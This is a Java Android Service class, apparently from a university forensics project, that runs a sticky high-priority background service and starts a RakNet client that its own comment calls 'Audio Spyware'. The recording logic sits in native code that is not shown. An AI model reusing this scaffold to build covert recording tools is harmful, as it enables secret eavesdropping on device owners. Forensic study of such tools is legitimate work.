package com.forensic.unipg.silenceaudiorecording;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Process;
import android.support.annotation.Nullable;

/**
 * Created by Gabriele on 30/05/16.
 */
public class SilenceAudioRecordingService extends Service
{
    static
    {
        System.load("libSilenceAudioRecordingNative.so");
    }


    private Looper mServiceLooper;
    private ServiceHandler mServiceHandler;

    // Handler that receives messages from the thread
    private final class ServiceHandler extends Handler
    {
        public ServiceHandler(Looper looper)
        {
            super(looper);
        }

        @Override
        public void handleMessage(Message msg)
        {
            //message
        }
    }

    @Override
    public void onCreate()
    {
        super.onCreate();
        // Start up the thread running the service.
        HandlerThread thread = new HandlerThread("ServiceStartArguments",  Process.THREAD_PRIORITY_AUDIO);
        thread.start();
        // Get the HandlerThread's Looper and use it for our Handler
        mServiceLooper  = thread.getLooper();
        mServiceHandler = new ServiceHandler(mServiceLooper);
        //start RakNet client Audio Spyware
        RakClient.start();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId)
    {
        //command
        Message msg = mServiceHandler.obtainMessage();
        msg.arg1 = startId;
        mServiceHandler.sendMessage(msg);

        // If we get killed, after returning from here, restart
        return START_STICKY;
    }


    @Override
    public void onDestroy()
    {
        RakClient.stop();
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }

}
